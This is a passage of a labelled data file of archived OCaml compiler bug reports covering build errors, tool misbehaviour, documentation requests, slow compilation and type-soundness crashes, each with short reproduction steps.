`Unix.sleep 0`.  Also, using nanosleep again, instead of select would be great.  I can prepare a GPR if you agree that both are regressions.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7256\n**Reporter:** junsli\n**Status:** closed (set by @damiendoligez on 2016-09-27T14:09:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Sparc\n**OS:** Solaris\n**OS Version:** 11\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** configure and build/install\n**Monitored by:** @gasche\n\n## Bug description\n\nFollow instructions in INSTALL, and get the following error:\r\n\r\ngcc -m32 -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -Wall -Werror -D_FILE_OFFSET_BITS=64 -D_REENTRANT -I../../byterun -fPIC -I../unix -DIN_OCAML_BIGARRAY -DCAML_NAME_SPACE -c mmap_unix.c\r\nIn file included from /usr/include/iso/string_iso.h:24:0,\r\n                 from /usr/include/string.h:11,\r\n                 from mmap_unix.c:21:\r\n/usr/include/sys/feature_tests.h:354:2: error: #error \"Compiler or options invalid for pre-UNIX 03 X/Open applications  and pre-2001 POSIX applications\"\r\n #error \"Compiler or options invalid for pre-UNIX 03 X/Open applications \\\r\n  ^\r\ngmake[3]: *** [mmap_unix.o] Error 1\n\n## Steps to reproduce\n\n./configure -cc \"gcc -m32\" -as \"as -32\" -aspp \"gcc -m32 -c\"\r\ngmake world\n\n## Additional information\n\n$ gcc -v\r\nUsing built-in specs.\r\nCOLLECT_GCC=gcc\r\nCOLLECT_LTO_WRAPPER=/usr/gcc/4.8/lib/gcc/sparc-sun-solaris2.11/4.8.2/lto-wrapper\r\nTarget: sparc-sun-solaris2.11\r\nConfigured with: ...configure CC=/usr/gcc/4.7/bin/gcc CXX=/usr/gcc/4.7/bin/g++ --prefix=/usr/gcc/4.8 --mandir=/usr/gcc/4.8/share/man --bindir=/usr/gcc/4.8/bin --libdir=/usr/gcc/4.8/lib --sbindir=/usr/gcc/4.8/sbin --infodir=/usr/gcc/4.8/share/info --libexecdir=/usr/gcc/4.8/lib --enable-languages=c,c++,fortran,objc --enable-shared --with-gmp-include=/usr/include/gmp --with-mpfr-include=/usr/include/mpfr --without-gnu-ld --with-ld=/usr/bin/ld --without-gnu-as --with-as=/usr/bin/as CFLAGS='-g -O2  -mtune=ultrasparc -mcpu=ultrasparc -mno-unaligned-doubles' CXXFLAGS='-g -O2 -mtune=ultrasparc -mcpu=ultrasparc -mno-unaligned-doubles'\r\nThread model: posix\r\ngcc version 4.8.2 (GCC)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7254\r\n**Reporter:** @hannesm\r\n**Assigned to:** @mshinwell\r\n**Status:** resolved (set by @mshinwell on 2017-03-10T14:56:00Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** text\r\n**Platform:** UNIX\r\n**OS:** FreeBSD\r\n**OS Version:** CURRENT\r\n**Version:** 4.03.0\r\n**Category:** documentation\r\n**Monitored by:** @diml @hcarty\r\n\r\n## Bug description\r\n\r\nexecuting ./ocamlnat leads to exception:\r\n\r\n        OCaml version 4.03.1+dev0-2016-04-25 - native toplevel\r\n\r\nFatal error: exception Cmi_format.Error(_)\r\n\r\n## Steps to reproduce\r\n\r\ncheck out the 4.03 branch (525799bfb56cb58d41f4a2f46ad183c70493ae60);\r\n./configure ; gmake world.opt ; gmake ocamlnat\r\n./ocamlnat\r\n\r\n## Additional information\r\n\r\nI also tried trunk/master, and got the same result (a crashing ocamlnat)\r\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7253\n**Reporter:** @dbuenzli\n**Status:** acknowledged (set by @damiendoligez on 2016-05-10T13:34:08Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** later\n**Category:** standard library\n**Tags:** junior_job\n**Related to:** #7796\n**Monitored by:** dexterph @hcarty @dbuenzli\n\n## Bug description\n\nThe behaviour in case of an [at_exit] callback raising is a little bit suboptimal (slightly related to #7178):\r\n\r\n1. A raising callback prevents callbacks registered earlier to be executed. \r\n2. A raising callback and all the callbacks that come after get called twice.\n\n## Steps to reproduce\n\n(* 1. prevents callbacks from running *)\r\n\r\n# let () = at_exit (fun () -> print_endline \"Once\";);;\r\n# let () = at_exit (fun () -> print_endline \"Twice\"; raise Exit);;\r\n# ^D\r\nTwice\r\nTwice\r\nFatal error: exception Pervasives.Exit\r\n...\r\n\r\n(* 2. Double calls *) \r\n\r\n# let () = at_exit (fun () -> print_endline \"Twice\"; raise Exit);;\r\n# let () = at_exit (fun () -> print_endline \"Once\";);;\r\n# ^D\r\nOnce\r\nTwice\r\nOnce\r\nTwice\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7250\n**Reporter:** @whitequark\n**Status:** confirmed (set by @gasche on 2016-05-10T10:54:17Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Target version:** later\n**Category:** platform support (windows, cross-compilation, etc)\n**Tags:** cross-compilation\n**Monitored by:** @hcarty @dbuenzli\n\n## Bug description\n\nPlease see https://github.com/whitequark/opam-cross-windows/issues/4.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7249\n**Reporter:** antron\n**Assigned to:** @garrigue\n**Status:** closed (set by @mshinwell on 2016-09-07T15:07:02Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n\n## Bug description\n\nThis seems analogous to ocaml/ocaml#7248\n\n## Steps to reproduce\n\nThis sets up a module structure \"Foo.Bar.a\", with two levels of mapping to get from the top level to the implementation of Bar.\r\n\r\nThe top level map:\r\ntop.ml:\r\n\r\nmodule Foo = Foo_map\r\n\r\n\r\nThe map for \"namespace\" Foo:\r\nfoo_map.ml:\r\n\r\nmodule Bar = Bar_mapped\r\n\r\n\r\n\"Lulz\" is supposed to be some sibling module of Bar, so we would want to compile it with -open Foo, and be able to reference Bar directly:\r\n\r\nlulz.ml:\r\n\r\nlet a = Bar.a\r\n\r\n\r\nThe correct invocation in 4.03.0 to do this is (correct output immediately below):\r\n\r\n$ ocamldep -modules -map foo_map.ml -map top.ml -open Foo -open Top lulz.ml\r\nlulz.ml: Bar_mapped Foo_map Top\r\n\r\n\r\nHowever, I would have expected (the output is incorrect):\r\n\r\n$ ocamldep -modules -map top.ml -map foo_map.ml -open Foo -open Top lulz.ml\r\nlulz.ml: Bar Foo_map Top\r\n\r\n\r\nThe -open options are also backwards above â these steps are without the fix in trunk.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7248\n**Reporter:** antron\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:52Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n\n## Bug description\n\nIt seems ocamldep has the order of -open options backwards.\n\n## Steps to reproduce\n\nnamespaces_map.ml:\r\n\r\nmodule Namespace =\r\nstruct\r\n  module Bar = Namespace__bar\r\n  module Foo = Namespace__foo\r\nend\r\nmodule Main = Main\r\n\r\n\r\nfoo.ml:\r\n\r\nlet a = Foo.a\r\n\r\n\r\n$ ocamldep -modules -map namespaces_map.ml -open Namespaces_map -open Namespace foo.ml\r\nfoo.ml: Foo Namespace Namespaces_map\r\n\r\n$ ocamldep -modules -map namespaces_map.ml -open Namespace -open Namespaces_map foo.ml\r\nfoo.ml: Namespace__foo Namespaces_map\r\n\r\n\r\nI would expect the outputs to be interchanged. For comparison:\r\n\r\n$ ocamlc -open Namespaces_map -open Namespace foo.ml\r\n(ok)\r\n\r\n$ ocamlc -open Namespace -open Namespaces_map foo.ml\r\nFile \"command line\", line 1:\r\nError: Unbound module Namespace\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7247\n**Reporter:** rbonichon\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-09-12T08:00:39Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n**Related to:** #7825\n\n## Bug description\n\nIt seems as if too many modules were exported for the documentation of 4.03 of the new release. I am not sure it qualifies as a bug but it does not feel right to me.\r\n\r\nComparing\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.02/libref/index.html\r\n\r\nwith\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.03/libref/\r\n\r\ngives an idea of the differences.\r\n\r\nFor example, I am not sure one wants Identifiable or Syntaxerr to be documented in libref.\r\n\r\nIf they indeed must be exported, it might be better to show these modules on another dedicated page.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7245\n**Reporter:** william\n**Assigned to:** @gasche\n**Status:** resolved (set by @mshinwell on 2016-09-08T09:19:12Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Monitored by:** @hcarty\n\n## Bug description\n\nIt would be nice to replace \"52 Fragile constant pattern\" by \"52 Fragile constant pattern (see detailed section below)\"\r\n\r\nAlso, I would replace the following explanations :\r\n\r\n\"If your code raises this warning, you should not change the way you test for the specific string to avoid the warning (for example using a string equality inside the right-hand-side instead of a literal pattern), as your code would remain fragile. You should instead enlarge the scope of the pattern by matching on all possible values. This may require some care: if the scrutinee may return several different cases of the same pattern, or raise distinct instances of the same exception, you may need to modify your code to separate those several cases.\"\r\n\r\n\r\nBy this :\r\nIf your code raises this warning, you should not change the way you test for the specific string to avoid the warning (for example using a string equality inside the right-hand-side instead of a literal pattern), as your code would remain fragile. You should instead enlarge the scope of the pattern by matching on all possible values, such as in this example :\r\n\r\nlet warning = function\r\n  | Foo _ -> 0\r\n  | _ -> 1\r\n\r\nThis may require some care: if the scrutinee may return several different cases of the same pattern, or raise distinct instances of the same exception, you may need to modify your code to separate those several cases. For example [...]\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7244\r\n**Reporter:** joris\r\n**Assigned to:** @chambart\r\n**Status:** closed (set by @damiendoligez on 2016-10-27T14:50:41Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Category:** back end (clambda to assembly)\r\n**Monitored by:** @trefis @gasche @ygrek @jmeber @hcarty @Chris00\r\n\r\n## Bug description\r\n\r\nocamlopt + flambda needs several GB of memory to build a file with a lot of (very) large array literals. ocaml 4.02.3 uses between 4 and 5 times less memory on the same files.\r\n\r\nThe attached file is generated by ragel, a parser generator which uses arrays to store the automata.\r\n\r\n## Steps to reproduce\r\n\r\nbuild attached file with ocamlopt.opt -Oclassic ragel_file.ml. On my machine it requires 3.3GB of memory at peak to complete and several minutes. (-Oclassic or -O2 or anything else doesn't actually matter, there is no function in the test file)\r\n\r\n(note the attached file is not the full ragel output but is enough to reproduce)\r\n\r\n## File attachments\r\n\r\n- [ragel_file.ml.xz](https://gist.githubusercontent.com/vicuna/c889373fe729149d9aa63c83012aeb96/raw/1bf6f94fe200e93fb6ba4315524181a6d7ac1830/ragel_file.ml.xz)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7243\n**Reporter:** shaynefletcher\n**Status:** closed (set by @damiendoligez on 2016-04-28T19:22:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nBuilding 4.03. I gunzip and tar xvf the source package but find that \r\n\r\n  tools/make-version-header.sh\r\n  stdlib/CompFlags\r\n\r\n\"breaks\" with my Cygwin /usr/bin/sed (choking on '\\r'). Problem overcome by running dos2unix on those two files.\r\n\r\nDetermined that the problem also exists (for me) with 4.02.3.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7242\n**Reporter:** @sliquister\n**Status:** acknowledged (set by @gasche on 2016-04-26T00:53:49Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** later\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @hcarty\n\n## Bug description\n\nIf I make a synthetic sum type and pattern match 10x bigger, the compiler takes ~100x longer to compile it. That makes for slow compilation times.\r\nIn my actual problem, the sum type is \"only\" 3500 constructors, but the patterns are more complicated and halving the number of constructors reduces the compilation time from 52s to 13s.\r\n\r\n$ /tmp/blowup 6000\r\n\r\nreal\t0m1.019s\r\nuser\t0m0.989s\r\nsys\t0m0.026s\r\n\r\n$ /tmp/blowup 60000\r\n\r\nreal\t1m52.447s\r\nuser\t1m52.021s\r\nsys\t0m0.227s\r\n\r\nHere is some snapshot from perf (it's pretty much the same profile the whole duration):\r\n 28.74% camlParmatch__le_pat_1938\r\n 23.62% compare_val\r\n 16.50% camlParmatch__const_compare_1133\r\n 10.27% caml_page_table_lookup\r\n  6.61% camlList__exists_1136\r\n  4.17% caml_compare\r\n  3.66% camlParmatch__le_pats_1939\r\n  3.30% caml_c_call\r\n  1.48% caml_apply2\r\n  1.19% camlParmatch__fun_4365\n\n## Steps to reproduce\n\n$ cat /tmp/blowup\r\n#!/bin/bash\r\n\r\n(\r\n    echo \"type t =\"\r\n    for ((i = 0; i < $1; i++)) do\r\n        echo \"| A$i\"\r\n    done\r\n    echo \"let of_string = function\"\r\n    for ((i = 0; i < $1; i++)) do\r\n        echo \"| $i -> A$i\"\r\n    done\r\n    echo \"| _ -> assert false\"\r\n) > a.ml\r\n\r\ntime ocamlc.opt -i > /dev/null -c a.ml\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7241\n**Reporter:** @stedolan\n**Assigned to:** @maranget\n**Status:** assigned (set by @mshinwell on 2017-03-09T12:39:53Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** crash\n**Category:** typing\n**Related to:** #5992\n**Monitored by:** junsli braibant @gasche @hcarty\n\n## Bug description\n\nOptimised pattern matching skips checking conditions that seem redundant. However, since OCaml supports pattern-matching mutable fields, and code execution during matching via \"lazy\" patterns, the truth of some conditions can vary during matching.\r\n\r\nThis can cause seemingly-impossible cases to be taken, if forcing lazy values causes mutations that confuse the optimised matching logic. Due to the presence of GADTs, taking an impossible case is a soundness issue.\r\n\r\nFor example, this program segfaults:\r\n\r\n    type (_, _) eq = Refl : ('a, 'a) eq\r\n    type (_, _) deq = Deq : ('a, 'x) eq option * ('x, 'b) eq option -> ('a, 'b) deq\r\n    \r\n    let deq1 = Deq (Some Refl, None)\r\n    let deq2 = Deq (None, Some Refl)\r\n    \r\n    type ('a, 'b) t = { \r\n      a : bool; \r\n      mutable b : ('a, 'b) deq;\r\n      mutable c : int Lazy.t\r\n    }\r\n    \r\n    let g (type a) (type b) : (a, b) t -> (a, b) eq = function\r\n    | { a = true; b = Deq (None, _) }\r\n    | { a = true; b = Deq (Some _, _); c = lazy 1 }\r\n    | { a = false }\r\n    | { b = Deq (_, None) } -> \r\n       assert false\r\n    | { b = Deq (Some Refl, Some Refl) } ->\r\n       Refl\r\n    \r\n    let bad =\r\n      let r = { a = true; b = deq1; c = lazy 1 } in\r\n      r.c <- lazy (r.b <- deq2; 2);\r\n      g r\r\n    \r\n    let castint (type a) (Refl : (int, a) eq) (x : int) : a = x\r\n    let _ = print_string (castint bad 42)\r\n\r\nThis program uses mutation to change a field from \"deq1\" to \"deq2\" during matching, making it seem like the impossible \"Deq (Some Refl, Some Refl)\". (The behaviour is very dependent on the exact sequence of cases in \"g\", and seemingly-equivalent programs will often give different behaviour).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7240\n**Reporter:** @sliquister\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-15T05:55:16Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** later\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe following code is accepted:\r\n\r\n# let f g = g ();;\r\nval f : (unit -> 'a) -> 'a = <fun>\r\n# let g1 ?a:_ () = ();;\r\nval g1 : ?a:'a -> unit -> unit = <fun>\r\n# f g1;;\r\n- : unit = ()\r\n\r\nso I don't understand why the following isn't:\r\n\r\n# let f g = g ~b:1 ();;\r\nval f : (b:int -> unit -> 'a) -> 'a = <fun>\r\n# let g1 ?a:_ ~b:_ () = ();;\r\nval g1 : ?a:'a -> b:'b -> unit -> unit = <fun>\r\n# f g1;;\r\nError: This expression has type ?a:'a -> b:'b -> unit -> unit\r\n       but an expression was expected of type b:int -> unit -> 'c\r\n\r\nThis is the behavior documented in http://caml.inria.fr/pub/docs/manual-ocaml/lablexamples.html, but I don't understand what would be problematic with allowing to fill in the missing optional arguments whether what follows are labelled arguments or positional arguments.\r\n\r\nAlso the behavior of the typer doesn't seem to be the documented behavior, as the documentation says this is correct, but the typer rejects it:\r\n\r\n# let f g = g () ();;\r\nval f : (unit -> unit -> 'a) -> 'a = <fun>\r\n# let g1 ?a:_ () () = ();;\r\nval g1 : ?a:'a -> unit -> unit -> unit = <fun>\r\n# let g2 () ?a:_ () = ();;\r\nval g2 : unit -> ?a:'a -> unit -> unit = <fun>\r\n# f g1;;\r\n- : unit = ()\r\n# f g2;;\r\nError: This expression has type unit -> ?a:'a -> unit -> unit\r\n       but an expression was expected of type unit -> unit -> 'b\n"},{"labels":["bug"],"text":"**Original bug ID:** 7239\n**Reporter:** furuse\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:51Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** text\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe following (pretty artificial) code produces Warning 42, even with disambiguation by a type constraint:\r\n\r\ntype a = C\r\ntype b = C\r\nlet a = (C : a) (* Warning 42: this use of C required disambiguation. *)\r\nlet b = (C : b)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7238\n**Reporter:** pfonseca\n**Status:** resolved (set by @xavierleroy on 2018-06-14T09:04:24Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** standard library\n**Monitored by:** @gasche @diml @oandrieu\n\n## Bug description\n\nThe semantic of Marshal.to_channel can lead to subtle bugs, particularly, when used with channels that are UDP sockets. The problem is due to the fact that to_channel fails when the message size is bigger than the UDP limit but, when it fails, it leaves part of the message (the prefix) in the internal data structures of the channel. \r\n\r\nLeaving the prefix of the message in the buffer is a problem because subsequent calls to to_channel will append messages to the buffer that will be sent. In practice, this causes corruption of messages and prevents correct unmarshalling on the receiver side.\r\n\r\nInternally, âMarshal.to_channelâ works in the following way: \r\n   a) While marshaling the components of message, to_channel makes several calls to the function caml_putblock [1] (through the sequence of invocations: to_channel [3] -> caml_output_value [2] -> caml_output_val [2] -> caml_really_putblock [1] -> caml_putblock [1])\r\n   b) On each invocation caml_putblock appends the input data to an internal buffer (channel->buff).\r\n   c) This buffer is flushed when (1) flush is explicitly called on the channel or (2) inside caml_putblock when new contents cannot be appended to the buffer because it would reach its maximum capacity. Flushing the buffer consists in calling the write system call on the socket file descriptor. The size of the internal buffer is larger than the UDP packet limit\r\n   d) When caml_putblock tries to flush the internal buffer (in a case where it is filled beyond the UDP limit) the call to the write system call fails (as expected) and it fails with the error EMSGSIZE. Upon such error, an exception (UnixError) is thrown, which will be handled by an exception handler but crucially two things happen (1) the internal buffer is not cleared (i.e., it retains the prefix of the message) and (2) nobody tries to resend the suffix of the message that was discarded.\r\n\r\nGiven the above, it is hard to correctly use the to_channel function on UDP sockets without explicitly checking before invoking to_channel that the message size fits within the content limit of UDP packets. To complicate matters further, the message size is not obvious to the callee given that the message sent will include marshaling metadata, not just user data.\r\n\r\nChapar [4] is an example of an application that is affected by this problem.\r\n\r\nReferences:\r\n    [1] https://github.com/ocaml/ocaml/blob/trunk/byterun/io.c\r\n    [2] https://github.com/ocaml/ocaml/blob/trunk/byterun/extern.c\r\n    [3] https://github.com/ocaml/ocaml/blob/trunk/stdlib/marshal.ml\r\n    [4] https://github.com/mit-plv/chapar/issues/2\n\n## File attachments\n\n- [diff-retry-on-EMSGSIZE.diff](https://gist.githubusercontent.com/vicuna/d144e01b9cb2fa583187f2b10cb5731c/raw/f4fca5e28bef84f5ca37c61427c8ab28d1f99722/diff-retry-on-EMSGSIZE.diff)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7237\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:53Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** tweak\n**Version:** 4.03.1+dev\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** junior_job\n**Monitored by:** @yallop @hcarty\n\n## Bug description\n\nThe very large tuples in the typeclass.mli interface (this code type-checks class declarations in particular)\r\n\r\n  https://github.com/ocaml/ocaml/blob/5401ce8/typing/typeclass.mli\r\n\r\ncould be turned into records with named fields to make code manipulating them more readable.\r\n\r\nA good way to get started would be to look at the variable names used in the implementation, for example check_coercions in\r\n\r\n  https://github.com/ocaml/ocaml/blob/5401ce8/typing/typeclass.ml#L1592-L1593\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7235\n**Reporter:** furuse\n**Assigned to:** @pierreweis\n**Status:** assigned (set by @damiendoligez on 2017-02-23T15:29:02Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** standard library\n**Monitored by:** @gasche\n\n## Bug description\n\nI have just noticed that the following code of stdlib/format.ml:\r\n\r\n(* Output everything left in the pretty printer queue at end of execution. *)\r\nlet () = at_exit print_flush\r\n\r\nThis code only flushes Format.std_formatter.  I am not sure it is easily possible to flush all the formatters associated with out_channels alive when at_exit is called but at least we can flush Format.err_formatter here too.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7234\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:25Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Related to:** #6992\n**Monitored by:** @gasche @yallop @hcarty\n\n## Bug description\n\nOCaml version 4.03.0+dev19-2016-04-15\r\n\r\n# type (_, _) eq = Eq : ('a, 'a) eq | Neq : int -> ('a, 'b) eq\r\nmodule F (T : sig type _ t end) = struct\r\n  let f (type a) (Neq n : (a, a T.t) eq) = n\r\nend\r\nmodule M = F (struct type 'a t = 'a end)\r\nlet _ = M.f Eq;;          \r\nSegmentation fault\r\n\r\nThe 'Eq' case should not be judged impossible, and the exhaustiveness check should fail but does not. This is a regression since 4.02.3, which correctly prints an exhaustivity warning and then raises Match_failure.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7232\n**Reporter:** antron\n**Assigned to:** @damiendoligez\n**Status:** closed (set by @damiendoligez on 2016-04-19T12:42:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @hcarty\n\n## Bug description\n\nPrinting an AST produced by ppx_deriving.show with Pprintast results in different spacing than entering the same source code directly and printing that. I haven't fully diagnosed the issue due to a lack of time, but I suppose ppx_deriving.show is programmatically generating some AST construct that hasn't received as much attention as constructs generated by the OCaml parser for the literal code.\r\n\r\nThis complicates testing using textual diffs.\n\n## Steps to reproduce\n\nopam install ocamlfind ppx_deriving ppx_tools.\r\n\r\nfoo.ml:\r\n\r\ntype a = Foo [@@deriving show]\r\n\r\n\r\nMakefile:\r\n\r\nPPX_DERIVING = `ocamlfind query ppx_deriving`\r\nPPX = $(PPX_DERIVING)/ppx_deriving $(PPX_DERIVING)/ppx_deriving_show.cma\r\n\r\n.PHONY : test\r\ntest :\r\n\tocamlfind ppx_tools/rewriter -ppx '$(PPX)' foo.ml\r\n\r\n\r\nThis results in the output:\r\n\r\ntype a =\r\n  | Foo [@@deriving show]\r\nlet rec (pp_a : Format.formatter -> a -> Ppx_deriving_runtime.unit) =\r\n  ((let open! Ppx_deriving_runtime in\r\n      fun fmt  -> function | Foo  -> Format.pp_print_string fmt \"Foo.Foo\")\r\n  [@ocaml.warning \"-A\"])\r\n\r\nand show_a : a -> Ppx_deriving_runtime.string=\r\n  fun x  -> Format.asprintf \"%a\" pp_a x\r\n\r\n\r\nHowever, parsing and re-printing the let rec ... and ... definitions directly results in a space before the \"=\" character on the line with \"and\".\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7231\n**Reporter:** @yallop\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2017-09-25T14:11:51Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Related to:** #6738 #7215 #7447\n**Monitored by:** runhang @stedolan @gasche\n\n## Bug description\n\n$ ocaml\r\n           OCaml version 4.03.0+beta2\r\n\r\n   # let rec r = let rec x () = r and y () = x () in y () in r \"oops\";; \r\n   Characters 58-64:\r\n     let rec r = let rec x () = r and y () = x () in y () in r \"oops\";; \r\n                                                               ^^^^^^\r\n   Warning 20: this argument will not be used by the function.\r\n   Segmentation fault\r\n\r\nThis should be fixed by the fix for PR6738 (and PR7215), which is now almost complete.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7230\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:25Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0+dev / +beta1\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** runhang @stedolan @gasche @hcarty\n\n## Bug description\n\nThe following program raises Match_error:\r\n\r\n   type _ t = T : int t\r\n   let _ = match (raise Not_found : float t) with _ -> .\r\n\r\nI think it should instead raise Not_found.\r\n\r\nMore generally, the code of the scrutinee is entirely discarded when a match has only refutation cases, but it should be retained and executed, even though the match itself is guaranteed to fail.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7229\n**Reporter:** @ivg\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:20Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Category:** typing\n**Monitored by:** @ivg @gasche @yallop\n\n## Bug description\n\nA behavior of polymorphic sum type is changed with respect to the polymorphic variant subtyping, when it is reintroduced via type equation.\n\n## Steps to reproduce\n\nGiven two types `ab` and `abc`, where the former is the subtype of the latter:\r\n\r\n   type ab = [`a | `b]\r\n   type abc = [ab| `c]\r\n\r\nThe following program (that uses `result` library from opam) typechecks:\r\n\r\n   let a : ab = `a\r\n   let x = Result.Error a;;\r\n   (x :> ('a,abc) Result.result);;\r\n\r\nHowever, if we reintroduce it with a type equation:\r\n\r\n   type ('a,'b) result = ('a,'b) Result.result = Ok of 'a | Error of 'b\r\n\r\n\r\nThen the following program doesn't typecheck:\r\n\r\n   let a : ab = `a\r\n   let x = Error a;;\r\n   (x :> ('a, sup) result);;\r\n   ^\r\n   Error: This expression cannot be coerced to type\r\n         ('a, sup) result = ('a, sup) Result.result;\r\n       it has type ('a, ab) result = ('a, ab) Result.result\r\n       but is here used with type ('a, < a : unit; .. > as 'b) Result.result\r\n       Type ab = [ `a | `b ] is not compatible with type 'b \r\n\r\nEven we try a full coercion:\r\n\r\n   (x : ('a,sub) result :> ('a, sup) result);;\r\n    ^\r\n   Error: This expression has type ('a, ab) result = ('a, ab) Result.result\r\n       but an expression was expected of type\r\n         ('a, sub) result = ('a, sub) Result.result\r\n       Type ab = [ `a | `b ] is not compatible with type\r\n         sub = < a : unit; b : unit >\n\n## Additional information\n\nIt still works for row-types, for example, if we define types `sub` and `sup`:\r\n\r\n   type sub = <a : unit; b : unit>\r\n   type sup = <a : unit>\r\n\r\nThe following program will typecheck:\r\n\r\n   let sub : sub = object method a = () method b = () end\r\n   let x = Error sub\r\n   (x :> ('a, sup) result);;\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7228\r\n**Reporter:** @alainfrisch\r\n**Status:** closed (set by @damiendoligez on 2016-04-18T14:49:11Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** major\r\n**Target version:** 4.03.0+dev / +beta1\r\n**Fixed in version:** 4.03.0+dev / +beta1\r\n**Category:** runtime system and C interface\r\n**Monitored by:** dberthod @braibant @jmeber @hcarty\r\n\r\n## Bug description\r\n\r\nThe following program:\r\n\r\n<pre>\r\nlet () =\r\n  let h = Hashtbl.create 1024 in\r\n  for k = 1 to 1000 do\r\n    Printf.printf \"=======================\\nROUND %d\\n\" k;\r\n    flush stdout;\r\n\r\n    Hashtbl.clear h;\r\n    for i = 1 to 10000000 do\r\n      Hashtbl.add h i (string_of_int i);\r\n    done\r\n  done\r\n</pre>\r\n\r\neats more and more memory and crashes after a few rounds (number is not deterministic).\r\n\r\nTests:\r\n\r\nMSVC 32-bit:\r\n trunk : crash after 25 or 19 rounds.\r\n 4.03  : crash after 25 or 19 rounds.\r\n 4.02  : memory usage oscillating between 150Mb and 